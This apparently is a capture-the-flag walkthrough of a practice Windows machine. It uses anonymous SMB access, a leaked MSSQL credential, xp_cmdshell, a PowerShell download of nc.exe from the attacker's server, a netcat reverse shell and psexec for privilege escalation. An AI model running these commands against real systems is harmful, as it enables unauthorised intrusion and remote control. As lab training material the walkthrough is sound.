It focuses on Windows shell privilege escalation, smbclient, mssql, and Linux commands.

Step 1 Scanning: nmap -sC -sV -A [Target_IP]

netBios-ssn (samba) on 139 (smbserver)
MsSql on 1433

Link to SMB: smbclient -N -L \\\\[Target_IP]\\
focus on No $ end of filename (password free)

Link to backups : smbclient -N \\\\[Target_IP]\\bckups
smb: \> ls (to list all file in backups)
smb: \> get [target_file] (download the file)

read the file can find User & Password
User : Archetype/sql_svc
Password : M3g4c0rp123

Step 2 Login MsSql server with the User & Password.
use impacket.git tool
link command: python3 /pwd/impacket/examples/mssqlclient.py Archetype/sql_svc@[Target_ip] -windows-auth

After login success:

sql>help (to see what operation you can do)
sql>enable xp_cmdshell (let sql can use cmdshell)

enable xp_cmdshell  is equal to use the four command
{
EXECUTE sp_configure 'show advanced options',1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell',1;
RECONFIGURE;
}

than you can use "xp_cmdshell" to do with cmd command.

Step 3 Stable shell (to reverse-shell)
first we follow the method: xp_cmdshell with nc
use the nc.exe tool on github

than we set up python server on our machine (in order to send the file to target system)
command : python3 -m http.server 
// Keep in mind to run the server in the folder your nc.exe file is present
// not dir nc.exe !! 

than go back to the mssql (target system), and use the download command:
xp_cmdshell "powershell.exe wget http://[Your_tun0_IP]:8000/nc.exe -OutFile c:\\Users\Public\\nc.exe"

if we successfully download the file we will get the information in our server instance
[target_ip] -- [Operation Time] "GET /nc.exe HTTP/1.1" 200 --

than we can use nc to get the connection to the target_system
command: nc -lvnp 4444
flag meaning: l --listen mode, v --verbose, n --numeric-only IP address(no DNS), p --port, e --execute

than go back to target system use the command:
xp_cmdshell "c:\\Users\Public\\nc.exe -e cmd.exe [Your_tun0_IP] 4444"

Step 4 Finding Our Flags and Privilege Escalation

we can use a tool to auto find the weak points in the system "Winpeas"
and use the same method to download the tool and send the tool by python server.

and Last we can reconnect the target with the psexec.py in impacket/example/psexe.py
command : python3 /pwd/impacket/examples/psexec.py [username]@[target_IP]

and we will login the system with higher privilege. Surf the file and find the target flag
